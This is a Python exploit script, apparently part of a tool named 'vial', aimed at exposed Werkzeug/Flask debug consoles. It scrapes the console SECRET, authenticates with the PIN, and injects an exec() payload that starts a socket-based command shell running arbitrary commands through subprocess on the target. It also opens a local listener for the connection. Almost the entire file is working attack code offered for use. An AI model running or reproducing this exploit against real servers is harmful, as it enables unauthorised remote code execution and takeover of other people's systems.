import asyncio
import httpx 
from urllib.parse import urljoin
import re
import vial
from vial.authenticate import authenticate
from vial.utils import check_iface
from vial import prompt, a_web_session
from vial.client import Client


def get_url() -> str:
    while True:
        url = prompt.ask("[bold blue][?][/] Enter the url")

        if "http" not in url[0:4]:
            vial.log.error("URL missing scheme")
            continue

        break
    
    return url


def get_serv_addr() -> tuple[str, int]:
    host = check_iface(prompt.ask("[bold blue][?][/] Enter the host", default="eth0"))
    port = prompt.ask("[bold blue][?][/] Enter the port", default="4444")

    return host, port

async def handle_client(reader, writer):
    vial.log.info("RECEIVED CONNECTION")
    data = await reader.read(100)
    addr = writer.get_extra_info("peername")
    vial.log.info(f"[{addr}] {data.decode()}")

async def connection_trigger(url: str, parameters: dict):
    del parameters["pin"] # NOTE : The PIN is an authentication specific parameter 
    print(parameters["cmd"])
    await a_web_session.get(url, params=parameters)


async def exploit():
    parameters = {
        "__debugger__": "yes",
        "frm": 0,
        "cmd": "pinauth",
        "pin": None,
        "s": None,
    }

    try:
        url = get_url()
        url = urljoin(url, "console")
        resp = httpx.get(url, follow_redirects=False)

        parameters["s"] = re.findall("SECRET = \"([^']{20})", resp.text)[0]
        await authenticate(parameters, url)
        
        HOST, PORT = get_serv_addr()
        parameters["cmd"] = f'exec("""\nimport socketserver, subprocess, ipaddress, netifaces, threading, time\nclass Service(socketserver.BaseRequestHandler):\n    def run(self, command: str) -> None:\n        process = subprocess.Popen(\n            command,\n            shell=True,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            stdin=subprocess.PIPE\n        )\n        return process.communicate()\n    def send(self, data: str | bytes) -> None:\n        if type(data) is str:\n            data = data.encode("utf-8")\n        self.request.sendall(data)\n    def receive(self) -> str:\n        return self.request.recv(4096).strip().decode("utf-8")\n    def cwd(self) -> bytes:\n        stderr, stdout = self.run("pwd")\n        self.send(stderr + stdout)\n    def handle(self) -> None:\n        host, port = self.client_address\n        while True:\n            self.cwd()\n            command = self.receive()\n            try:\n                if command.lower() == "quit":\n                    self.send("[*] Received <quit>. Exiting pseudo-shell\\n")\n                    break\n                else:\n                    stderr, stdout = self.run(command)\n                    self.send(stderr + stdout)\n            except BrokenPipeError as e:\n                break\nclass ThreadedService(\n        socketserver.ThreadingTCPServer,\n        socketserver.DatagramRequestHandler\n):\n    pass\nserver = ThreadedService(({HOST},{PORT}), Service)\nserver.allow_reuse_address = True\nserver_thread = threading.Thread(target=server.serve_forever)\nserver_thread.daemon = True\nserver_thread.start()\nhost, port = server.server_address\nwhile (threading.active_count() >= 2):\n    time.sleep(10)\n""")' 
        #server = await asyncio.start_server(
        #    handle_client, HOST, PORT)
        server = await asyncio.start_server(
            Client((HOST, int(PORT))), HOST, PORT)
        
        vial.log.info(f"Serving on [{HOST}:{PORT}]")
        task = asyncio.create_task(connection_trigger(url, parameters))
        
        async with server:
            await server.serve_forever()

        await task
    except httpx.RequestError as e:
        return vial.log.error(
            f"Failed to fetch [bold]SECRET[/bold] from the server.\n{e}"
        )


if __name__ == "__main__":
    asyncio.run(exploit())
